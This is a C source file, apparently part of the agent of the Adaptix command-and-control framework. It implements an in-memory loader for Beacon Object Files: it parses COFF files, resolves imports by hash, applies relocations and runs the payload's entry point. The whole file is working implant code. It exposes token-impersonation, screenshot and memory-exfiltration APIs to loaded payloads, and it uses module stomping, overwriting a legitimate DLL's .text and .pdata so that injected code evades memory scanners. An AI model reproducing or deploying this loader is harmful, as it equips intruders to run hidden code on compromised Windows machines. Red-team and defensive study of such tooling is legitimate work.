#include "bof_loader.h"
#include "ProcLoader.h"
#include "utils.h"
#include "Boffer.h"
#include "config.h"

#define llabs(n) ((n) < 0 ? -(n) : (n))

#if defined(__x86_64__) || defined(_WIN64)
int IMP_LENGTH = 6;
#else
int IMP_LENGTH = 7;
#endif

int my_strncpy_s(char* dest, unsigned int destsz, const char* src, unsigned int count) {
    if (!dest || !src) return 1;
    if (destsz == 0)   return 2;

    unsigned int i = 0;
    for (; i < count && i < destsz - 1 && src[i] != '\0'; ++i)
        dest[i] = src[i];

    if (i < count && src[i] != '\0') {
        dest[0] = '\0';
        return 3;
    }
    dest[i] = '\0';
    return 0;
}


#define BEACON_FUNCTIONS_COUNT 32

BOF_API BeaconFunctions[BEACON_FUNCTIONS_COUNT] = {

    /// 5 - Data Parser API

    { HASH_FUNC_BEACONDATAPARSE,              (LPVOID) BeaconDataParse },
    { HASH_FUNC_BEACONDATAINT,                (LPVOID) BeaconDataInt },
    { HASH_FUNC_BEACONDATASHORT,              (LPVOID) BeaconDataShort },
    { HASH_FUNC_BEACONDATALENGTH,             (LPVOID) BeaconDataLength },
    { HASH_FUNC_BEACONDATAEXTRACT,            (LPVOID) BeaconDataExtract },

    /// 2 - Output API

    { HASH_FUNC_BEACONOUTPUT,                 (LPVOID) BeaconOutput },
    { HASH_FUNC_BEACONPRINTF,                 (LPVOID) BeaconPrintf },

    /// 7 - Format API

    { HASH_FUNC_BEACONFORMATALLOC,            (LPVOID) BeaconFormatAlloc },
    { HASH_FUNC_BEACONFORMATRESET,            (LPVOID) BeaconFormatReset },
    { HASH_FUNC_BEACONFORMATAPPEND,           (LPVOID) BeaconFormatAppend },
    { HASH_FUNC_BEACONFORMATPRINTF,           (LPVOID) BeaconFormatPrintf },
    { HASH_FUNC_BEACONFORMATTOSTRING,         (LPVOID) BeaconFormatToString },
    { HASH_FUNC_BEACONFORMATFREE,             (LPVOID) BeaconFormatFree },
    { HASH_FUNC_BEACONFORMATINT,              (LPVOID) BeaconFormatInt },

    /// 7 - Internal APIs

    { HASH_FUNC_BEACONUSETOKEN,               (LPVOID) BeaconUseToken },
    { HASH_FUNC_BEACONREVERTTOKEN,            (LPVOID) BeaconRevertToken },
    { HASH_FUNC_BEACONISADMIN,                (LPVOID) BeaconIsAdmin },
    { HASH_FUNC_TOWIDECHAR,                   (LPVOID) toWideChar },
    { HASH_FUNC_BEACONADDVALUE,               (LPVOID) BeaconAddValue },
    { HASH_FUNC_BEACONGETVALUE,               (LPVOID) BeaconGetValue },
    { HASH_FUNC_BEACONREMOVEVALUE,            (LPVOID) BeaconRemoveValue },

    /// 2 - Adaptix APIs
    { HASH_FUNC_AXADDSCREENSHOT,  (LPVOID) AxAddScreenshot },
    { HASH_FUNC_AXDOWNLOADMEMORY, (LPVOID) AxDownloadMemory },

    /// 3 - Async BOF APIs
    { HASH_FUNC_BEACONREGISTERTHREADCALLBACK,   (LPVOID) BeaconRegisterThreadCallback },
    { HASH_FUNC_BEACONUNREGISTERTHREADCALLBACK, (LPVOID) BeaconUnregisterThreadCallback },
    { HASH_FUNC_BEACONWAKEUP,                   (LPVOID) BeaconWakeup },
    { HASH_FUNC_BEACONGETSTOPJOBEVENT,          (LPVOID) BeaconGetStopJobEvent },

    /// 5 - Other APIs

    { HASH_FUNC_LOADLIBRARYA,                 (LPVOID) proxy_LoadLibraryA },
    { HASH_FUNC_GETMODULEHANDLEA,             (LPVOID) proxy_GetModuleHandleA },
    { HASH_FUNC_FREELIBRARY,                  (LPVOID) proxy_FreeLibrary },
    { HASH_FUNC_GETPROCADDRESS,               (LPVOID) proxy_GetProcAddress },
    { HASH_FUNC___C_SPECIFIC_HANDLER,         NULL },
};

void* FindProcBySymbol(char* symbol)
{
    if ( StrLenA(symbol) > IMP_LENGTH) {
        ULONG funcHash = Djb2A((PUCHAR) symbol + IMP_LENGTH);
        for (int i = 0; i < BEACON_FUNCTIONS_COUNT; i++) {
            if (funcHash == BeaconFunctions[i].hash) {
                if ( BeaconFunctions[i].proc != NULL )
                    return BeaconFunctions[i].proc;
            }
        }

        char symbolCopy[1024] = { 0 };
        memcpy(symbolCopy, symbol, StrLenA(symbol));

        CHAR c1[] = { '$',0 };
        CHAR c2[] = { '@',0 };

        char* moduleName = symbolCopy + IMP_LENGTH;
        moduleName = StrTokA(moduleName, c1);

        char* funcName = StrTokA(NULL, c1);
        funcName = StrTokA(funcName, c2);

        funcHash = Djb2A((PUCHAR)funcName);
        HMODULE hModule = ApiWin->LoadLibraryA(moduleName);

        memset(symbolCopy, 0, StrLenA(symbol));

        if (hModule)
            return GetSymbolAddress(hModule, funcHash);
    }

    return NULL;
}

char* PrepareEntryName(char* targetFuncName)
{
#if defined(__x86_64__) || defined(_WIN64)
    return targetFuncName;
#else
    int targetLength = StrLenA(targetFuncName);
    char* entryName = (char*)MemAllocLocal(targetLength + 2);
    if (!entryName)
        return NULL;

    entryName[0] = '_';
    memcpy(entryName + 1, targetFuncName, targetLength + 1);
    return entryName;
#endif
}

void FreeFunctionName(char* targetFuncName)
{
#if !defined(__x86_64__) && !defined(_WIN64)
    MemFreeLocal((LPVOID*) & targetFuncName, StrLenA(targetFuncName));
#endif
}

bool AllocateSections(unsigned char* coffFile, COF_HEADER* pHeader,
                      PCHAR* mapSections, LPVOID* outMapFunctions,
                      BOF_STOMP_CTX* stompCtx)
{
    *outMapFunctions = NULL;

    if (stompCtx && stompCtx->initialised) {

        DWORD totalSize = 0;
        for (int i = 0; i < pHeader->NumberOfSections; i++) {
            COF_SECTION* s = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + sizeof(COF_SECTION) * i);
            DWORD slotSize = ALIGN_UP((DWORD)s->SizeOfRawData + UNWIND_SLOT_SIZE, 16);
            totalSize += slotSize;
        }
        totalSize += MAP_FUNCTIONS_SIZE;

        if (totalSize > (DWORD)stompCtx->textSize) {
            // BOF doesn't fit — fall through to VirtualAlloc
            goto fallback;
        }

        DWORD oldProt = 0;
        if (!ApiWin->VirtualProtect(stompCtx->textBase, totalSize,
                                    PAGE_EXECUTE_READWRITE, &oldProt)) {
            goto fallback;
        }

        char* cursor = (char*)stompCtx->textBase;
        for (int i = 0; i < pHeader->NumberOfSections; i++) {
            COF_SECTION* s = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + sizeof(COF_SECTION) * i);
            DWORD slotSize = ALIGN_UP((DWORD)s->SizeOfRawData + UNWIND_SLOT_SIZE, 16);

            mapSections[i] = cursor;

            memset(cursor, 0, slotSize);

            if (s->PointerToRawData && s->SizeOfRawData)
                memcpy(cursor, coffFile + s->PointerToRawData, s->SizeOfRawData);

            if (s->SizeOfRawData)
                ((unsigned char*)cursor)[s->SizeOfRawData] = 0x01;

            cursor += slotSize;
        }

        memset(cursor, 0, MAP_FUNCTIONS_SIZE);
        *outMapFunctions = cursor;

        stompCtx->cursorBase = stompCtx->textBase;
        stompCtx->cursorSize = totalSize;
        stompCtx->inUse      = TRUE;

        return true;
    }

fallback:
    {
        DWORD totalSize = 0;
        DWORD sectionOffsets[MAX_SECTIONS] = { 0 };

        for (int i = 0; i < pHeader->NumberOfSections; i++) {
            COF_SECTION* s = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + sizeof(COF_SECTION) * i);
            sectionOffsets[i] = totalSize;
            DWORD slotSize = ALIGN_UP((DWORD)s->SizeOfRawData + UNWIND_SLOT_SIZE, 16);
            totalSize += slotSize;
        }
        totalSize += MAP_FUNCTIONS_SIZE;

        char* base = (char*)ApiWin->VirtualAlloc(NULL, totalSize,
                                                  MEM_COMMIT | MEM_RESERVE,
                                                  PAGE_EXECUTE_READWRITE);
        if (!base)
            return false;

        memset(base, 0, totalSize);

        for (int i = 0; i < pHeader->NumberOfSections; i++) {
            COF_SECTION* s = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + sizeof(COF_SECTION) * i);
            mapSections[i] = base + sectionOffsets[i];

            if (s->PointerToRawData && s->SizeOfRawData)
                memcpy(mapSections[i], coffFile + s->PointerToRawData, s->SizeOfRawData);
        }

        *outMapFunctions = base + (totalSize - MAP_FUNCTIONS_SIZE);
    }

    return true;
}

void CleanupSections(PCHAR* mapSections, int maxSections, LPVOID mapFunctions,
                     BOF_STOMP_CTX* stompCtx)
{
    if (stompCtx && stompCtx->initialised && stompCtx->inUse) {

        // Restore .pdata if needed (may have already been done by ExecuteProc)
        if (stompCtx->pdataStomped &&
            stompCtx->savedPdata &&
            stompCtx->pdataBase &&
            stompCtx->pdataSize) {
            DWORD pdProt = 0;
            if (ApiWin->VirtualProtect(stompCtx->pdataBase, stompCtx->pdataSize,
                                       PAGE_READWRITE, &pdProt)) {
                memcpy(stompCtx->pdataBase, stompCtx->savedPdata, stompCtx->pdataSize);
                DWORD pdTmp = 0;
                ApiWin->VirtualProtect(stompCtx->pdataBase, stompCtx->pdataSize, pdProt, &pdTmp);
            }
            stompCtx->pdataStomped = FALSE;
        }

        // Restore original .text bytes
        DWORD oldProt = 0;
        ApiWin->VirtualProtect(stompCtx->cursorBase, stompCtx->cursorSize,
                               PAGE_EXECUTE_READWRITE, &oldProt);
        memset(stompCtx->cursorBase, 0, stompCtx->cursorSize);
        memcpy(stompCtx->cursorBase, stompCtx->savedBytes, stompCtx->cursorSize);
        ApiWin->VirtualProtect(stompCtx->cursorBase, stompCtx->cursorSize,
                               PAGE_EXECUTE_READ, &oldProt);

        for (int i = 0; i < maxSections; i++)
            mapSections[i] = NULL;

        stompCtx->cursorBase = NULL;
        stompCtx->cursorSize = 0;
        stompCtx->inUse      = FALSE;

        // Solo destruir el ctx si NO pertenece al pool.
        // Los slots del pool son reutilizables — ReleaseStompSlot los devuelve.
        if (!stompCtx->pooled)
            BofStompDestroy(stompCtx);

    } else {
        // VirtualAlloc fallback path — since the fix, all sections live in a single
        // contiguous block starting at mapSections[0]. Free only that base pointer.
        // mapFunctions points inside the same block (last MAP_FUNCTIONS_SIZE bytes),
        // so it must NOT be freed separately.
        if (mapSections[0]) {
            ApiWin->VirtualFree(mapSections[0], 0, MEM_RELEASE);
        }
        for (int i = 0; i < maxSections; i++)
            mapSections[i] = NULL;
        // mapFunctions is inside the same block — already freed above, do NOT free again.

        if (stompCtx)
            BofStompDestroy(stompCtx);
    }
}

bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSections,
                        COF_SYMBOL* pSymbolTable, LPVOID* mapFunctions)
{
    bool status = TRUE;
    int  mapFunctionsSize = 0;
    char* procSymbol = NULL;
    char  procSymbolShort[9] = { 0 };

    for (int sectionIndex = 0; sectionIndex < pHeader->NumberOfSections; sectionIndex++) {
        COF_SECTION* pSection = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + sizeof(COF_SECTION) * sectionIndex);
        COF_RELOCATION* pRelocTable = (COF_RELOCATION*)(coffFile + pSection->PointerToRelocations);

        for (int relocIndex = 0; relocIndex < pSection->NumberOfRelocations; relocIndex++) {
            COF_SYMBOL pSymbol = pSymbolTable[pRelocTable->SymbolTableIndex];
            if (pRelocTable->SymbolTableIndex >= (DWORD)pHeader->NumberOfSymbols) {
                BeaconOutput(BOF_ERROR_PARSE, NULL, 0);
                return FALSE;
            }

            int   offset      = 0;
            void* procAddress = NULL;
#ifdef _WIN64
            unsigned long long bigOffset = 0;
#endif

            if (pSymbol.Name.dwName[0] == 0) {
                procSymbol = ((char*)(pSymbolTable + pHeader->NumberOfSymbols)) + pSymbol.Name.dwName[1];
            } else {
                if (pSymbol.Name.cName[7] != 0) {
                    my_strncpy_s(procSymbolShort, sizeof(procSymbolShort),
                                 pSymbol.Name.cName, sizeof(pSymbol.Name.cName));
                    procSymbol = procSymbolShort;
                } else {
                    procSymbol = pSymbol.Name.cName;
                }
            }

            if (pSymbol.SectionNumber > 0) {
                procAddress = mapSections[pSymbol.SectionNumber - 1];
                procAddress = (void*)((char*)procAddress + pSymbol.Value);
            } else if (pSymbol.Value == 0 &&
                       (pSymbol.StorageClass == IMAGE_SYM_CLASS_EXTERNAL ||
                        pSymbol.StorageClass == IMAGE_SYM_CLASS_EXTERNAL_DEF)) {
                procAddress = FindProcBySymbol(procSymbol);
                if (procAddress == NULL &&
                    pSymbolTable[pRelocTable->SymbolTableIndex].SectionNumber == 0) {
                    BeaconOutput(BOF_ERROR_SYMBOL, procSymbol, StrLenA(procSymbol));
                    status = FALSE;
                } else {
                    ((LPVOID*)mapFunctions)[mapFunctionsSize] = procAddress;
                    procAddress = &((LPVOID*)mapFunctions)[mapFunctionsSize];
                    mapFunctionsSize++;
                }
            } else {
                BeaconOutput(BOF_ERROR_SYMBOL, "Undefined symbol", 17);
                status = FALSE;
            }

            if (status != FALSE) {
#ifdef _WIN64
                if (pRelocTable->Type == IMAGE_REL_AMD64_ADDR64) {
                    memcpy(&bigOffset, mapSections[sectionIndex] + pRelocTable->VirtualAddress,
                           sizeof(unsigned long long));
                    bigOffset += (unsigned long long)procAddress;
                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress,
                           &bigOffset, sizeof(unsigned long long));
                } else if (pRelocTable->Type == IMAGE_REL_AMD64_ADDR32NB) {
                    // ADDR32NB: 32-bit image-relative offset (RVA).
                    // The field value is an addend; the result must be the offset
                    // from the relocation site+4 to the target symbol.
                    // Restore the original calculation which is correct regardless
                    // of whether sections are contiguous or scattered in memory.
                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress,
                           sizeof(int));
                    if (((char*)(mapSections[pSymbol.SectionNumber - 1] + offset) -
                         (char*)(mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4))
                        > 0xffffffff) {
                        return FALSE;
                    }
                    offset = (int)((char*)(mapSections[pSymbol.SectionNumber - 1] + offset) -
                                   (char*)(mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4));
                    offset += pSymbolTable[pRelocTable->SymbolTableIndex].Value;
                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress,
                           &offset, sizeof(int));
                } else if (pRelocTable->Type == IMAGE_REL_AMD64_REL32 ||
                           pRelocTable->Type == IMAGE_REL_AMD64_REL32_1 ||
                           pRelocTable->Type == IMAGE_REL_AMD64_REL32_2 ||
                           pRelocTable->Type == IMAGE_REL_AMD64_REL32_3 ||
                           pRelocTable->Type == IMAGE_REL_AMD64_REL32_4 ||
                           pRelocTable->Type == IMAGE_REL_AMD64_REL32_5) {
                    offset = 0;
                    int typeIndex = pRelocTable->Type - 4;
                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress,
                           sizeof(int));
                    if (llabs((long long)procAddress -
                              (long long)(mapSections[sectionIndex] +
                                          pRelocTable->VirtualAddress + 4 + typeIndex))
                        > UINT_MAX) {
                        return FALSE;
                    }
                    offset += ((size_t)procAddress -
                               ((size_t)mapSections[sectionIndex] +
                                pRelocTable->VirtualAddress + 4 + typeIndex));
                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress,
                           &offset, sizeof(int));
                }
#else
                if (pRelocTable->Type == IMAGE_REL_I386_DIR32) {
                    offset = 0;
                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress,
                           sizeof(int));
                    offset = (unsigned int)procAddress + offset;
                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress,
                           &offset, sizeof(unsigned int));
                } else if (pRelocTable->Type == IMAGE_REL_I386_REL32) {
                    offset = 0;
                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress,
                           sizeof(int));
                    offset = (unsigned int)procAddress -
                             (unsigned int)(mapSections[sectionIndex] +
                                            pRelocTable->VirtualAddress + 4);
                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress,
                           &offset, sizeof(unsigned int));
                }
#endif
            }
            pRelocTable = (COF_RELOCATION*)((char*)pRelocTable + sizeof(COF_RELOCATION));
        }
    }
    return status;
}

void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize,
                 COF_SYMBOL* pSymbolTable, COF_HEADER* pHeader, PCHAR* mapSections,
                 BOF_STOMP_CTX* stompCtx)
{
#ifdef _WIN64
    BOF_RUNTIME_FUNCTION* rfEntries       = NULL;
    DWORD                 rfEntriesSize   = 0;
    int                   registeredCount = 0;
    BOOL                  wroteInPlace    = FALSE;
#endif
    BOOL entryFound = FALSE;

#ifdef _WIN64
    for (int si = 0; si < pHeader->NumberOfSections; si++) {
        COF_SECTION* s = (COF_SECTION*)((unsigned char*)pHeader + sizeof(COF_HEADER) +
                                        sizeof(COF_SECTION) * si);

        if (memcmp(s->Name, ".pdata\0\0", 8) != 0) continue;
        if (!s->SizeOfRawData || !s->PointerToRawData) break;

        int numEntries = (int)(s->SizeOfRawData / sizeof(BOF_RUNTIME_FUNCTION));
        if (numEntries <= 0) break;

        DWORD bofPdataSize = s->SizeOfRawData;
        BOF_RUNTIME_FUNCTION* bofPdata = (BOF_RUNTIME_FUNCTION*)MemAllocLocal(bofPdataSize);
        if (!bofPdata) break;

        memcpy(bofPdata, (unsigned char*)pHeader + s->PointerToRawData, bofPdataSize);

        BOOL stompInPlace = (stompCtx &&
                             stompCtx->initialised &&
                             stompCtx->inUse &&
                             stompCtx->pdataBase &&
                             stompCtx->moduleBase &&
                             numEntries <= (int)stompCtx->pdataCapacity);

        ULONG_PTR rvaBase = stompInPlace ? (ULONG_PTR)stompCtx->moduleBase
                                         : (ULONG_PTR)mapSections[0];

        COF_RELOCATION* relocs = (COF_RELOCATION*)((unsigned char*)pHeader + s->PointerToRelocations);
        for (int ri = 0; ri < s->NumberOfRelocations; ri++) {
            COF_RELOCATION* r   = &relocs[ri];
            COF_SYMBOL      sym = pSymbolTable[r->SymbolTableIndex];

            if (r->Type != IMAGE_REL_AMD64_ADDR32NB) continue;
            if (sym.SectionNumber <= 0 || sym.SectionNumber > pHeader->NumberOfSections) continue;

            char* targetBase = mapSections[sym.SectionNumber - 1];
            if (!targetBase) continue;

            DWORD*    field    = (DWORD*)((unsigned char*)bofPdata + r->VirtualAddress);
            DWORD     addend   = *field;
            ULONG_PTR absolute = (ULONG_PTR)targetBase + (DWORD)sym.Value + addend;

            if (absolute < rvaBase || (absolute - rvaBase) > 0xFFFFFFFFULL) {
                if (stompInPlace) {
                    stompInPlace = FALSE;
                    rvaBase      = (ULONG_PTR)mapSections[0];
                    memcpy(bofPdata, (unsigned char*)pHeader + s->PointerToRawData, bofPdataSize);
                    ri = -1;
                    continue;
                }
            }
            *field = (DWORD)(absolute - rvaBase);
        }

        if (stompInPlace) {
            // Sort entries by BeginAddress (insertion sort — small N)
            for (int a = 1; a < numEntries; a++) {
                BOF_RUNTIME_FUNCTION key = bofPdata[a];
                int b = a - 1;
                while (b >= 0 && bofPdata[b].BeginAddress > key.BeginAddress) {
                    bofPdata[b + 1] = bofPdata[b];
                    b--;
                }
                bofPdata[b + 1] = key;
            }

            DWORD oldProt = 0;
            if (ApiWin->VirtualProtect(stompCtx->pdataBase, stompCtx->pdataSize,
                                       PAGE_READWRITE, &oldProt)) {
                BOF_RUNTIME_FUNCTION* dst = (BOF_RUNTIME_FUNCTION*)stompCtx->pdataBase;
                memcpy(dst, bofPdata, (DWORD)numEntries * sizeof(BOF_RUNTIME_FUNCTION));

                for (DWORD k = (DWORD)numEntries; k < stompCtx->pdataCapacity; k++) {
                    dst[k].BeginAddress = 0xFFFFFFFF;
                    dst[k].EndAddress   = 0xFFFFFFFF;
                    dst[k].UnwindData   = 0;
                }

                DWORD tmp = 0;
                ApiWin->VirtualProtect(stompCtx->pdataBase, stompCtx->pdataSize, oldProt, &tmp);
                stompCtx->pdataStomped = TRUE;
                wroteInPlace = TRUE;
            }

            MemFreeLocal((LPVOID*)&bofPdata, bofPdataSize);
            bofPdata = NULL;
        } else {
            rfEntries     = bofPdata;
            rfEntriesSize = bofPdataSize;
            bofPdata      = NULL;
            BOOL ok = (BOOL)(ULONG_PTR)ApiNt->RtlAddFunctionTable(
                (void*)rfEntries, numEntries, (DWORD64)mapSections[0]
            );
            if (ok) registeredCount = 1;
        }

        if (bofPdata)
            MemFreeLocal((LPVOID*)&bofPdata, bofPdataSize);
        break;
    }
#endif // _WIN64

    for (int i = 0; i < pHeader->NumberOfSymbols; i++) {
        if (StrCmpA(pSymbolTable[i].Name.cName, entryFuncName) == 0) {
            void(*proc)(char*, unsigned long) =
                (void(*)(char*, unsigned long))(mapSections[pSymbolTable[i].SectionNumber - 1] +
                                                pSymbolTable[i].Value);
            proc((char*)args, argsSize);
            entryFound = TRUE;
            break;
        }
    }

#ifdef _WIN64
    if (rfEntries) {
        if (registeredCount == 1) {
            ApiNt->RtlDeleteFunctionTable((void*)rfEntries);
        } else {
            for (int j = 0; j < registeredCount; j++)
                ApiNt->RtlDeleteFunctionTable((void*)&rfEntries[j]);
        }
    }

    // Restore .pdata if we wrote it in-place (sync BOF path)
    if (wroteInPlace &&
        stompCtx &&
        stompCtx->pdataStomped &&
        stompCtx->savedPdata &&
        stompCtx->pdataBase &&
        stompCtx->pdataSize) {
        DWORD oldProt = 0;
        if (ApiWin->VirtualProtect(stompCtx->pdataBase, stompCtx->pdataSize,
                                   PAGE_READWRITE, &oldProt)) {
            memcpy(stompCtx->pdataBase, stompCtx->savedPdata, stompCtx->pdataSize);
            DWORD tmp = 0;
            ApiWin->VirtualProtect(stompCtx->pdataBase, stompCtx->pdataSize, oldProt, &tmp);
        }
        stompCtx->pdataStomped = FALSE;
    }

    if (rfEntries)
        MemFreeLocal((LPVOID*)&rfEntries, rfEntriesSize);
#endif

    if (!entryFound)
        BeaconOutput(BOF_ERROR_ENTRY, NULL, 0);
}

Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFile,
                      unsigned int cofFileSize, unsigned char* args, int argsSize)
{
    COF_HEADER*  pHeader       = NULL;
    COF_SYMBOL*  pSymbolTable  = NULL;
    PCHAR        entryFuncName = NULL;
    LPVOID       mapFunctions  = NULL;
    BOOL         result        = FALSE;
    PCHAR        mapSections[MAX_SECTIONS] = { 0 };
    BOF_STOMP_CTX* stompCtx   = NULL;

    InitBofOutputData();
    bofTaskId = taskId;

    if (!coffFile || !targetFuncName)
        goto RET;

    pHeader      = (COF_HEADER*)coffFile;
    pSymbolTable = (COF_SYMBOL*)(coffFile + pHeader->PointerToSymbolTable);

    if (isBofStompEnabled())
        stompCtx = BofStompCreate(getBofStompDll(), getBofStompMethod());

    entryFuncName = PrepareEntryName(targetFuncName);
    if (!entryFuncName) {
        BeaconOutput(BOF_ERROR_ENTRY, NULL, 0);
        goto RET;
    }

    result = AllocateSections(coffFile, pHeader, mapSections, &mapFunctions, stompCtx);
    if (!result) {
        BeaconOutput(BOF_ERROR_ALLOC, NULL, 0);
        goto RET;
    }

    if (!mapFunctions) {
        BeaconOutput(BOF_ERROR_ALLOC, NULL, 0);
        goto RET;
    }

    result = ProcessRelocations(coffFile, pHeader, mapSections, pSymbolTable,
                                (LPVOID*)mapFunctions);
    if (!result)
        goto RET;

    ExecuteProc(entryFuncName, args, argsSize, pSymbolTable, pHeader, mapSections, stompCtx);

RET:
    FreeFunctionName(entryFuncName);
    CleanupSections(mapSections, MAX_SECTIONS, mapFunctions, stompCtx);

    bofTaskId = 0;

    return bofOutputPacker;
}
